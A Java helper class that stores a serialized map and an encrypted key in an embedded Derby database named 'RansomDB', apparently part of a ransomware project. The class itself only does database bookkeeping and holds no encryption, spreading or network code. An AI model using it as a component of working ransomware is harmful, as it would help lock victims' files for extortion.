package com.security;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.sql.*;
import java.util.HashMap;
import java.util.TreeMap;


public class EmbeddedDatabase {


    private static final String DATABASENAME = "RansomDB";
    private static final String TABLENAME = "RansomTable";
    private static final String JDBC_URL = "jdbc:derby:" + DATABASENAME + ";create=true";

    // jdbc Connection
    private static final Connection conn;

    static {
        Connection tempconn = null;
        try {
            Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
            tempconn = DriverManager.getConnection(JDBC_URL);
            if (tempconn != null) {
                System.out.println("connect success");
            }
        } catch (Exception except) {
            except.printStackTrace();
        }
        conn = tempconn;
    }


    public static boolean CreateTable() {
        PreparedStatement preparedStatement = null;
        boolean flag = false;
        String createTableSQL = "CREATE TABLE " + TABLENAME + "(MapTable BLOB ,EncryptedKey VARCHAR(100))";

        try {
            preparedStatement = conn.prepareStatement(createTableSQL);

            System.out.println(createTableSQL);

            // execute create SQL stetement
            preparedStatement.executeUpdate();


            conn.commit();
            System.out.println("Table" + TABLENAME + "is created!");

        } catch (SQLException e) {
            System.out.println(e.getMessage());
            if (DerbyUtils.tableAlreadyExists(e)) { //check if the exception is because of pre-existing table.
                flag = true;
            }

        } finally {

            if (preparedStatement != null) {
                try {
                    preparedStatement.close();
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
        }
        return flag;
    }


    public static void InsertRecordIntoTable(TreeMap<String, HashMap<String, String>> map, final String EncryptedKey) {
        PreparedStatement preparedStatement = null;
        String insertTableSQL = "insert into " + TABLENAME + " values(?,?)";

        try {

            preparedStatement = conn.prepareStatement(insertTableSQL);

            byte[] buf = Serializer.Serialize(map);
            preparedStatement.setBinaryStream(1, new ByteArrayInputStream(buf), buf.length);
            preparedStatement.setString(2, EncryptedKey);

            // execute insert SQL stetement
            preparedStatement.executeUpdate();

            conn.commit();
            System.out.println("Insert Success");

        } catch (SQLException e) {

            System.out.println(e.getMessage());

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (preparedStatement != null) {
                try {
                    preparedStatement.close();

                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }

        }
    }


    public static TreeMap<String, HashMap<String, String>> GetMapFromTable() {


        PreparedStatement preparedStatement = null;
        TreeMap<String, HashMap<String, String>> map = null;
        String selectSQL = "SELECT MapTable FROM " + TABLENAME + " ";

        try {
            preparedStatement = conn.prepareStatement(selectSQL);

            // execute select SQL stetement
            ResultSet rs = preparedStatement.executeQuery();

            while (rs.next()) {

                InputStream input = rs.getBinaryStream("MapTable");
                map = Serializer.Deserialize(input);
                return map;

            }

        } catch (SQLException e) {

            System.out.println(e.getMessage());

        } catch (Exception e) {
            return map;
        } finally {
            try {
                if (preparedStatement != null) {
                    preparedStatement.close();
                }
            } catch (Exception ex) {
                System.out.println("Exception during Resource.close()" + ex);
            }
        }
        return map;
    }


    public static String SelectKeyFromTable() throws SQLException {


        PreparedStatement preparedStatement = null;
        String value = "";
        String selectSQL = "SELECT EncryptedKey FROM " + TABLENAME + " ";

        try {
            preparedStatement = conn.prepareStatement(selectSQL);

            // execute select SQL stetement
            ResultSet rs = preparedStatement.executeQuery();

            while (rs.next()) {

                value = rs.getString("EncryptedKey");
                return value;

            }

        } catch (SQLException e) {

            System.out.println(e.getMessage());

        } catch (Exception e) {
            return value;
        } finally {

            if (preparedStatement != null) {
                preparedStatement.close();
            }
        }
        return value;
    }

    public static void DropTable() {
        PreparedStatement preparedStatement = null;

        String createTableSQL = "DROP TABLE " + TABLENAME + "";

        try {
            preparedStatement = conn.prepareStatement(createTableSQL);

            System.out.println(createTableSQL);

            // execute create SQL stetement
            preparedStatement.executeUpdate();


            conn.commit();
            System.out.println("Table " + TABLENAME + "DROPED");

        } catch (SQLException e) {

            System.out.println(e.getMessage());

        } finally {

            if (preparedStatement != null) {
                try {
                    preparedStatement.close();
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static boolean shutdown() {
        try {
            if (conn != null) {
                //  DriverManager.getConnection(JDBC_URL + ";shutdown=true");
                conn.close();
                return true;
            } else {
                return false;
            }
        } catch (SQLException sqlExcept) {
            return false;
        }

    }

}
